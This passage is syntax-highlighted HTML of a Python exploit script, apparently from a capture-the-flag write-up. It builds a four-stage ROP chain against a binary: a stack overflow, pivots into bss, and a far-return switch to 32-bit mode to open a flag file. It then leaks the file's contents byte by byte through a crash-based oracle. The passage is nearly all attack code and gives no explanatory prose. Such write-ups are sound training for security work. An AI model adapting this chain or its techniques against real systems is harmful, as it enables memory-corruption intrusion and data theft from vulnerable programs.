</span></span><span class=line><span class=cl>    <span class=n>target</span> <span class=o>=</span> <span class=p>(</span><span class=n>ary</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=nb>int</span><span class=p>(</span><span class=n>ary</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>LOCAL</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>guess</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;testing </span><span class=si>%d</span><span class=s1>, guess = </span><span class=si>%#x</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>guess</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;target = </span><span class=si>%r</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>zio</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>print_read</span><span class=o>=</span><span class=n>COLORED</span><span class=p>(</span><span class=n>REPR</span><span class=p>,</span> <span class=s1>&#39;yellow&#39;</span><span class=p>),</span> <span class=n>print_write</span><span class=o>=</span><span class=n>COLORED</span><span class=p>(</span><span class=n>REPR</span><span class=p>,</span> <span class=s1>&#39;cyan&#39;</span><span class=p>),</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>10000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>LOCAL</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>gdb_hint</span><span class=p>(</span><span class=n>breakpoints</span><span class=o>=</span><span class=p>[</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># 0x401205,     # before ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=mh>0x401222</span><span class=p>,</span>     <span class=c1># before main ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># do proof of work?</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># io.readline()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># input(&#39;continue?&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>flag_addr</span> <span class=o>=</span> <span class=mh>0x40d160</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>flag_path</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;./flag&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>new_stack2</span> <span class=o>=</span> <span class=mh>0x40D200</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>new_stack3</span> <span class=o>=</span> <span class=mh>0x40d400</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>new_stack4</span> <span class=o>=</span> <span class=mh>0x40d600</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pop_rax_ret</span> <span class=o>=</span> <span class=mh>0x401001</span>      <span class=c1># pop rax/eax ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>syscall_pop_ret</span> <span class=o>=</span> <span class=mh>0x401165</span>  <span class=c1># syscall ; pop ebp ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi_pop_ret</span> <span class=o>=</span> <span class=mh>0x401734</span>  <span class=c1># pop rdi ; pop rbp ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pop_r14_pop2_ret</span> <span class=o>=</span> <span class=mh>0x0000000000401731</span> <span class=c1># pop r14 ; pop r15 ; pop rbp ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pop_rsi_pop2_ret</span> <span class=o>=</span> <span class=mh>0x0000000000401732</span> <span class=c1># pop rsi ; pop r15 ; pop rbp ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pop_rbx_pop3_ret</span> <span class=o>=</span> <span class=mh>0x403072</span> <span class=c1># pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret | pop ebx ; inc ecx ; pop esi ; inc ecx ; pop edi ; pop ebp ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>store_rdi_rax_ret</span> <span class=o>=</span> <span class=mh>0x0000000000403beb</span> <span class=c1>#  mov qword ptr [rdi + rdx - 0x27], rax ; mov rax, rdi ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>access_rcx</span> <span class=o>=</span> <span class=mh>0x0000000000402fee</span> <span class=c1># mov byte ptr [rcx + rdi - 5], 0x89 ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pop_rcx_ret</span> <span class=o>=</span> <span class=mh>0x000000000040117b</span>    <span class=c1># pop rcx ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;_&#39;</span> <span class=o>*</span> <span class=mh>0x30</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;_____RBP&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>pop_rax_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>flag_path</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>pop_rdi_pop_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>flag_addr</span> <span class=o>+</span> <span class=mh>0x27</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x5f5f5f5f5f5f5f5f</span><span class=p>)</span> <span class=c1># fill rbp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>store_rdi_rax_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>pop_rdi_pop_ret</span><span class=p>)</span>            
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>new_stack2</span><span class=p>)</span>            <span class=c1># bss</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x5f5f5f5f5f5f5f5f</span><span class=p>)</span>  <span class=c1># fill rbp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x401170</span><span class=p>)</span>            <span class=c1># read stage2 ROP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x401730</span><span class=p>)</span>            <span class=c1># pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>new_stack2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;_&#39;</span> <span class=o>*</span> <span class=mi>24</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x401222</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x4011ed</span><span class=p>)</span>    <span class=c1># retf</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x401222</span> <span class=o>|</span> <span class=p>(</span><span class=mh>0x23</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># mode switched</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l32</span><span class=p>(</span><span class=n>pop_rax_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l32</span><span class=p>(</span><span class=mh>0x5</span><span class=p>)</span>        <span class=c1># open</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l32</span><span class=p>(</span><span class=n>pop_rbx_pop3_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l32</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l32</span><span class=p>(</span><span class=mh>0x5f5f5f5f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l32</span><span class=p>(</span><span class=mh>0x5f5f5f5f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l32</span><span class=p>(</span><span class=mh>0x5f5f5f5f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l32</span><span class=p>(</span><span class=n>pop_rcx_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>int80_ret</span> <span class=o>=</span> <span class=mh>0x4011f3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l32</span><span class=p>(</span><span class=n>int80_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># switch back</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l32</span><span class=p>(</span><span class=mh>0x4011ed</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l32</span><span class=p>(</span><span class=mh>0x401222</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l32</span><span class=p>(</span><span class=mh>0x33</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>pop_rdi_pop_ret</span><span class=p>)</span>            
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>new_stack3</span><span class=p>)</span>          <span class=c1># bss</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x5f5f5f5f5f5f5f5f</span><span class=p>)</span>  <span class=c1># fill rbp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x401170</span><span class=p>)</span>            <span class=c1># read stage3 ROP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x401730</span><span class=p>)</span>            <span class=c1># pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload2</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>new_stack3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 0x0000000000406a43 : add al, byte ptr [rax] ; add byte ptr [rax + 0x14], bh ; syscall</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 0x000000000040884e : je 0x408855 ; movsb byte ptr [rdi], byte ptr [rsi] ; dec edx ; jne 0x408850 ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;_&#39;</span> <span class=o>*</span> <span class=mi>24</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>pop_rax_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>pop_rdi_pop_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>                  <span class=c1># fd</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x5f5f5f5f5f5f5f5f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>pop_rsi_pop2_ret</span><span class=p>)</span>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x5f5f5f5f5f5f5f5f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x5f5f5f5f5f5f5f5f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>syscall_pop_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x5f5f5f5f5f5f5f5f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>pop_rdi_pop_ret</span><span class=p>)</span>            
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>new_stack4</span><span class=p>)</span>          <span class=c1># bss</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x5f5f5f5f5f5f5f5f</span><span class=p>)</span>  <span class=c1># fill rbp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x401170</span><span class=p>)</span>            <span class=c1># read stage3 ROP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x401730</span><span class=p>)</span>            <span class=c1># pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload3</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>new_stack4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;_&#39;</span> <span class=o>*</span> <span class=mi>24</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>pop_rcx_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x40e000</span> <span class=o>-</span> <span class=mi>1</span> <span class=o>+</span> <span class=mi>5</span> <span class=o>-</span> <span class=n>guess</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>pop_rbx_pop3_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>      <span class=c1># rbx = 0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>access_rcx</span><span class=p>)</span>       <span class=c1># r14</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x5f5f5f5f5f5f5f5f</span><span class=p>)</span> <span class=c1># r15</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x5f5f5f5f5f5f5f5f</span><span class=p>)</span> <span class=c1># rbp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>pop_rax_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>flag_addr</span> <span class=o>+</span> <span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>pop_rsi_pop2_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>l64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>l64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x4011BE</span><span class=p>)</span>   <span class=c1># mov bl, [rsi+rax]; mov rdi, rbx; push r14; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>pop_rdi_pop_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x5f5f5f5f5f5f5f5f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload4</span> <span class=o>+=</span> <span class=n>l64</span><span class=p>(</span><span class=mh>0x401170</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>p</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>([</span><span class=n>payload</span><span class=p>,</span> <span class=n>payload2</span><span class=p>,</span> <span class=n>payload3</span><span class=p>,</span> <span class=n>payload4</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>LOCAL</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;stage</span><span class=si>%d</span><span class=s1>?&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mh>0xc0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s1>&#39;payload2 too long: </span><span class=si>%#x</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>p</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>writeline</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>read_until_timeout</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>io</span><span class=o>.</span><span class=n>is_eof_seen</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>ConnectionResetError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>,</span> <span class=mi>127</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>v</span> <span class=o>=</span> <span class=n>test</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>flag</span><span class=p>),</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>v</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;flag = </span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>flag</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;}&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
